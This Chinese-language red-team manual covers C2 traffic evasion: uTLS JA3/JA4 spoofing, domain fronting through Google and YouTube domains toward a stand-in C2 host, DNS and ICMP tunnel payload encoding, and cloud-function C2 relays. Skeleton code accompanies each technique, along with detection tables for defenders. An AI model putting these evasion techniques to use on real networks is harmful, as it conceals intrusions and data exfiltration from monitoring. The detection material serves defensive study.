# 协议层免杀（PROTOCOL_EVASION）

> 本文件为 `c2-custom-evasion.md` 技能文件索引的伴生手册（补齐断链），并承担 **P0-7「C2 流量特征消除工程」**
> 与 P1 的 TLS 指纹（JA4）、DNS/ICMP 隧道、域前置高信誉域细节。
> 覆盖 **TLS 指纹伪造（uTLS/ja3transport/JA4）→ 域前置（Google Meet/YouTube/GCP）→ DNS 隧道 → 云 API 滥用 → 检测侧（NDR/JA3 基线）→ 实测判据**。
> 授权立场见 `refs/README.md`；外部技术点（JA4 指南、uTLS go-bypasser、域前置 cryptika 研究）在文中以 URL 注明。

## 1. TLS 指纹伪造（JA3 / JA4 / uTLS）

### 1.1 指纹原理

```
JA3 = MD5( TLS 版本 + 密码套件列表 + 扩展列表 + 椭圆曲线 + 曲线格式 )
JA4 = 更细粒度（含 QUIC、HTTP/2、扩展顺序与值），抗 JA3 的 hash 碰撞
```

### 1.2 uTLS 伪造（Go）

```go
// 用 uTLS 伪造浏览器 ClientHello，使 JA3/JA4 匹配 Chrome/Firefox
import tls "github.com/refraction-networking/utls"

conn, err := tls.UClient(rawConn, &tls.Config{ServerName: host}, tls.HelloChrome_Auto)
// HelloChrome_Auto 自动匹配最新 Chrome 指纹
// 其他 profile：HelloFirefox_Auto / HelloIOS_Auto / HelloRandomized
```

### 1.3 ja3transport（透明代理伪造）

```go
// ja3transport 包装 http.Transport，自动替换 ClientHello 指纹
import "github.com/CUCyber/ja3transport"
tr, _ := ja3transport.NewTransport(ja3transport.WithJA3(ja3, ja3s))
client := &http.Client{Transport: tr}
```

### 1.4 go-bypasser / tls-client 思路

- **go-bypasser**（审计 §5）：动态生成多浏览器/多设备指纹，绕过基于 JA3 的封禁。
- **tls-client**：预置 Chrome/Firefox/Safari 等多 profile，API 与 net/http 兼容。
- 思路共性：**不只是 ClientHello，还要伪造 HTTP/2 帧序、扩展顺序、ALPN、SNI 行为**，使 Akamai 等被动指纹也一致。

### 1.5 JA4/JA4+ 伪造要点

| 维度 | JA3 只看 | JA4 增加 |
|---|---|---|
| 版本/套件 | ✓ | ✓ |
| 扩展顺序/值 | 顺序 | 具体值 + QUIC |
| HTTP/2 | ✗ | 帧序/优先级 |
| SNI/ALPN | 部分 | 完整 |

**伪造**：必须让「TLS ClientHello + HTTP/2 SETTINGS 帧序 + ALPN」整体匹配目标浏览器，单改 ClientHello 会被 JA4 识破。

---

## 2. 域前置（Domain Fronting）

### 2.1 原理

```
SNI（TLS 外层）→ 高信誉前端域（CDN 接受的）
Host（HTTP 内层）→ 真实 C2 域名
CDN 按 Host 转发，IDS 只看 SNI 看不到真实目标
```

**关键**：TLS SNI 与 HTTP Host 分离；CDN 接受任意 Host 时才可行。

### 2.2 高信誉前端域（Google Meet/YouTube/GCP 变体，审计 §5）

| 前端域 | 用途 | 说明 |
|---|---|---|
| `accounts.google.com` | Google 账号域 | 高信誉 CDN 前置 |
| `meet.google.com` | Google Meet | cryptika 研究变体 |
| `www.youtube.com` | YouTube | 高信誉前端 |
| `www.gstatic.com` | Google 静态 | 前置 + 缓存 |
| `*.cloudfunctions.net` / `*.run.app` | GCP 云函数 | 云 API 滥用型前置 |

**实现**（curl 思路，工程代码用带 SNI/Host 分离的 TLS 客户端）：

```go
// SNI 与 Host 分离（骨架示例）
tlsCfg := &tls.Config{ServerName: "meet.google.com"}   // SNI = 前端域
req.Host = "real-c2.example.com"                        // Host = 真实 C2
```

### 2.3 检测侧：SNI/Host 不一致

| 判据 | 方法 |
|---|---|
| SNI ≠ Host | NDR 解析 TLS SNI 与 HTTP Host 比对 |
| 前端域异常 | 高信誉域（Google/YouTube）承载非其业务的 Host |

---

## 3. DNS 隧道（载荷编码）

### 3.1 原理

```
Beacon → DNS 查询（子域编码 payload）→ 权威 DNS → C2 解析 → 响应编码在 TXT/CNAME
```

### 3.2 载荷编码

```python
# 骨架示例：把 payload 编码进 DNS 查询子域（base32 避免大小写/字符限制）
import base64
def encode_query(data: bytes) -> str:
    enc = base64.b32encode(data).decode().lower().rstrip('=')   # base32 子域安全
    labels = [enc[i:i+63] for i in range(0, len(enc), 63)]       # 每标签 ≤63
    return '.'.join(labels) + '.tun.example.com'
# 响应走 TXT：C2 把结果 base64 放进 TXT 记录，beacon 解析还原
```

### 3.3 检测侧：DNS 熵/频率基线

| 判据 | 方法 |
|---|---|
| 子域高熵 | DNS 查询子域长度 + 熵异常（正常域短、低熵） |
| 查询频率 | 固定间隔（beacon 节拍）查询 + TXT 记录异常 |
| 单域高度 | 大量查询集中在单一权威域 |

---

## 4. ICMP 隧道

```python
# 骨架示例：ICMP 载荷编码（ping 隧道）
# 把 payload 拆块塞进 ICMP Echo 请求的 data 段，响应塞进 Echo Reply
# 需 raw socket 或 scapy 构造；检测侧看 ICMP 体积/频率异常
```

**检测侧**：ICMP payload 体积异常（正常 ping 固定小载荷）、频率异常、数据段高熵。

---

## 5. 云 API 滥用（Cloud API Abuse）

### 5.1 云函数代理

```python
# 骨架示例：GCP Cloud Functions / AWS Lambda / Cloudflare Workers 作为 C2 中继
# 1) C2 真实域名通过云函数转发，目标只看到云厂商域名/IP
# 2) 用云厂商 TLS 证书（*.cloudfunctions.net / *.workers.dev），指纹/证书可信
def handler(request):
    # 校验 token -> 转发到真实 C2 -> 回传响应
    return forward_to_c2(request)
```

### 5.2 检测侧

| 判据 | 方法 |
|---|---|
| 云函数域名异常 | 云厂商域名承载非业务流量 + 频率异常 |
| token 模式 | 请求体固定 token + 加密 blob |

---

## 6. 检测侧总表（回馈 attack-defense）

| 技术 | 检测点 | 判据 |
|---|---|---|
| TLS 指纹伪造 | NDR 被动 JA3/JA4 | 指纹偏离浏览器基线（需整体匹配，含 HTTP/2） |
| 域前置 | SNI/Host 分离 | SNI ≠ Host + 高信誉域异常 |
| DNS 隧道 | 子域熵/频率 | 高熵子域 + 固定节拍 + TXT 异常 |
| ICMP 隧道 | ICMP 体积/频率 | 大载荷 + 高熵 + 频率异常 |
| 云 API 滥用 | 云域名流量 | 非业务流量 + token 模式 |

## 7. 实测判据

| 判据 | 方法 |
|---|---|
| JA3/JA4 是否匹配浏览器 | NDR 工具（zeek/JA4 指南）比对目标 profile |
| 域前置是否生效 | 抓包确认 SNI 与 Host 分离且 CDN 转发成功 |
| 隧道是否被识别 | DNS/ICMP 流量熵 + 频率基线比对 |

*WARNING: 授权红队评估与安全研究专用。*
